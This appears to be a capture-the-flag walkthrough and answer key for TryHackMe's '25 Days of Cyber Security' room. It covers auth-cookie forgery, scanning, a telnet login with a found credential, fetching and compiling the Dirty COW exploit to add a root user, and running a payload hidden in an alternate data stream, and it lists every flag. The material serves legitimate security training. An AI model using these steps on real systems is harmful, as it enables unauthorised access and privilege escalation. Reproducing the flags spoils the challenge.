---
description: https://tryhackme.com/room/learncyberin25days
---

# 25 Days of Cyber Security

## Day 1 A Christmas Crisis

#### What is the name of the cookie used for authentication?

![](<../.gitbook/assets/Screenshot from 2021-09-10 17-50-48.png>)

{% hint style="success" %}
`auth`
{% endhint %}

#### In what format is the value of this cookie encoded?

{% hint style="success" %}
`hexadecimal`
{% endhint %}

#### Having decoded the cookie, what format is the data stored in?

```bash
echo -n '7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a22757365726e616d65227d' | xxd -r -p
# {"company":"The Best Festival Company", "username":"username"}
```

{% hint style="success" %}
`json`
{% endhint %}

#### What is the value of Santa's cookie?

```bash
echo -n '{"company":"The Best Festival Company", "username":"santa"}' \
| xxd -p | tr -d '\n'
```

{% hint style="success" %}
`7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d`
{% endhint %}

#### What is the flag you're given when the line is fully active?

![](<../.gitbook/assets/Screenshot from 2021-09-10 17-48-45.png>)

{% hint style="success" %}
`THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}`
{% endhint %}

## Day 2 The Elf Strikes Back!

## Day 13 Coal for Christmas

#### What old, deprecated protocol and service is running?

```bash
nmap -A 10.10.144.45
# 22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
# 23/tcp  open  telnet  Linux telnetd
# 111/tcp open  rpcbind 2-4 (RPC #100000)
# | rpcinfo: 
# |   program version    port/proto  service
# |   100000  2,3,4        111/tcp   rpcbind
# |   100000  2,3,4        111/udp   rpcbind
# |   100000  3,4          111/tcp6  rpcbind
# |   100000  3,4          111/udp6  rpcbind
# |   100024  1          44720/udp6  status
# |   100024  1          51647/udp   status
# |   100024  1          52433/tcp   status
# |_  100024  1          59507/tcp6  status
# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

{% hint style="success" %}
`telnet`
{% endhint %}

#### What credential was left for you?

```bash
telnet 10.10.144.45
# Username: santa
# Password: clauschristmas
```

{% hint style="success" %}
`clauschristmas`
{% endhint %}

#### What distribution of Linux and version number is this server running?

```bash
cat /etc/lsb-release
# DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
```

{% hint style="success" %}
`Ubuntu 12.04`
{% endhint %}

#### Who got here first?

```bash
sed -n 2p cookies_and_milk.txt
# // HAHA! Too bad Santa! I, the Grinch, got here 
```

{% hint style="success" %}
`Grinch`
{% endhint %}

#### What is the verbatim syntax you can use to compile, taken from the real C source code comments?

```bash
wget http://10.17.20.154/40839.c
sed -n 17p 40839.c
```

{% hint style="success" %}
`gcc -pthread dirty.c -o dirty -lcrypt`
{% endhint %}

#### What "new" username was created, with the default operations of the real C source code?

```bash
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
# You can log in with the username 'firefart' and the password 'firefart'.
su firefart
```

{% hint style="success" %}
`firefart`
{% endhint %}

#### What "new" username was created, with the default operations of the real C source code?

```bash
cd /root
cat message_from_the_grinch.txt 
tree | md5sum | tee coal
```

{% hint style="success" %}
`8b16f00dd3b51efadb02c1df7f8427cc`
{% endhint %}

## Day 15 There's a Python in my stocking!

#### What's the output of True + True?

{% hint style="success" %}
`2`
{% endhint %}

#### What's the database for installing other peoples libraries called?

{% hint style="success" %}
`PyPi`
{% endhint %}

#### What is the output of bool("False")?

{% hint style="success" %}
`True`
{% endhint %}

#### What library lets us download the HTML of a webpage?

{% hint style="success" %}
`requests`
{% endhint %}

#### What is the output of the program provided in "Code to analyse for Question 5" in today's material?

{% hint style="success" %}
`[1, 2, 3, 6]`
{% endhint %}

#### What causes the previous task to output that?

{% hint style="success" %}
`pass by reference`
{% endhint %}

## Day 16 Help! Where is Santa

#### What is the port number for the web server?

{% hint style="success" %}
`80`
{% endhint %}

#### Without using enumerations tools such as Dirbuster, what is the directory for the API?

```python
import requests
from bs4 import BeautifulSoup

html = requests.get("http://10.10.104.149")
soup = BeautifulSoup(html.text, "html.parser")

for link in soup.find_all("a"):
    print(link.get("href"))
```

{% hint style="success" %}
`/api/`
{% endhint %}

#### Where is Santa right now?

```python
import requests

for i in range(1, 100, 2):
    json = requests.get(f"http://10.10.104.149/api/{i}").json()
    if "Error" not in json["q"]:
        print(json)
        break
```

{% hint style="success" %}
`Winter Wonderland, Hyde Park, London.`
{% endhint %}

#### Find out the correct API key.

{% hint style="success" %}
`57`
{% endhint %}

## Day 17 ReverseElFeering

```bash
r2 -d ./challenge1
> aa
> pdf @main
# |   sym.main ();
# |           ; var int local_ch @ rbp-0xc
# |           ; var int local_8h @ rbp-0x8
# |           ; var int local_4h @ rbp-0x4
# |           0x00400b4d      55             push rbp
# |           0x00400b4e      4889e5         mov rbp, rsp
# |           0x00400b51      c745f4010000.  mov dword [local_ch], 1
# |           0x00400b58      c745f8060000.  mov dword [local_8h], 6
# |           0x00400b5f      8b45f4         mov eax, dword [local_ch]
# |           0x00400b62      0faf45f8       imul eax, dword [local_8h]
# |           0x00400b66      8945fc         mov dword [local_4h], eax
# |           0x00400b69      b800000000     mov eax, 0
# |           0x00400b6e      5d             pop rbp
# \           0x00400b6f      c3             ret
```

#### What is the value of local\_ch when its corresponding movl instruction is called?

{% hint style="success" %}
`1`
{% endhint %}

#### What is the value of **eax** when the imull instruction is called?

{% hint style="success" %}
`6`
{% endhint %}

#### What is the value of local\_4h before eax is set to 0?

{% hint style="success" %}
`6`
{% endhint %}

## Day 18 The Bits of Christmas

![](<../.gitbook/assets/Screenshot from 2021-09-11 12-59-15.png>)

#### What is Santa's password?

{% hint style="success" %}
`santapassword321`
{% endhint %}

#### Now that you've retrieved this password, try to login...What is the flag?

{% hint style="success" %}
`thm{046af}`
{% endhint %}

## Day 20 PowershELlF to the rescue

#### Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?

```bash
Get-ChildItem -Path .\Documents\ -File -Hidden
Get-Content C:\Users\mceager\Documents\e1fone.txt
# All I want is my '2 front teeth'!!!
```

{% hint style="success" %}
`2 front teeth`
{% endhint %}

#### Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?

```bash
Get-ChildItem -Path .\Desktop\ -Directory -Hidden
Get-Content -Path .\Desktop\elf2wo\e70smsW10Y4k.txt 
# I want the movie Scrooged <3!
```

{% hint style="success" %}
`Scrooged`
{% endhint %}

#### Search the Windows directory for a hidden folder that contains files for Elf 3. What is the name of the hidden folder?

```bash
Get-ChildItem -Path C:\Windows\ -Directory -Hidden -Recurse -ErrorAction SilentlyContinue
```

{% hint style="success" %}
`3lfthr3e`
{% endhint %}

#### How many words does the first file contain?

```bash
Get-Content -Path C:\Windows\System32\3lfthr3e\1.txt | Measure-Object
```

{% hint style="success" %}
`9999`
{% endhint %}

#### What 2 words are at index 551 and 6991 in the first file?

```bash
(Get-Content -Path C:\Windows\System32\3lfthr3e\1.txt)[551,6991]
```

{% hint style="success" %}
`Red Ryder`
{% endhint %}

#### This is only half the answer. Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want?

```bash
Get-Content -Path C:\Windows\System32\3lfthr3e\2.txt | Select-String -Pattern 'Ryder'
```

{% hint style="success" %}
`red ryder bb gun`
{% endhint %}

## Day 21 Time for some ELForensics

#### Read the contents of the text file within the Documents folder. What is the file hash for db.exe?

```bash
Get-Content -Path '.\Documents\db file hash.txt'
```

{% hint style="success" %}
`596690FFC54AB6101932856E6A78E3A1`
{% endhint %}

#### What is the file hash of the mysterious executable within the Documents folder?

```bash
Get-FileHash .\Documents\deebee.exe -Algorithm MD5
```

{% hint style="success" %}
`5F037501FB542AD2D9B06EB12AED09F0`
{% endhint %}

#### Using Strings find the hidden flag within the executable?

```bash
C:\Tools\strings64 -accepteula .\Documents\deebee.exe
# Set-Content -Path .\lists.exe -value $(Get-Content $(Get-Command C:\Users\littlehelper\Documents\db.exe).Path -ReadCount 0 -Encoding Byte) -Encoding Byte -Stream hidedb
```

{% hint style="success" %}
`THM{f6187e6cbeb1214139ef313e108cb6f9}`
{% endhint %}

#### What is the flag that is displayed when you run the database connector file?

```bash
Get-Item -Path .\Documents\deebee.exe -Stream *
# Stream : hidedb
get wmic process call create $(Resolve-Path .\Documents\deebee.exe:hidedb)
```

{% hint style="success" %}
`THM{3088731ddc7b9fdeccaed982b07c297c}`
{% endhint %}

## Day 22 Elf McEager becomes CyberElf





```bash
```



```bash
```

```bash
```

##















































































## Thank you!

#### Please help us improve by answer this 5 minute survey!

![](<../.gitbook/assets/Screenshot from 2021-09-11 10-18-54.png>)

{% hint style="success" %}
`thm{thank_you_2020}`
{% endhint %}
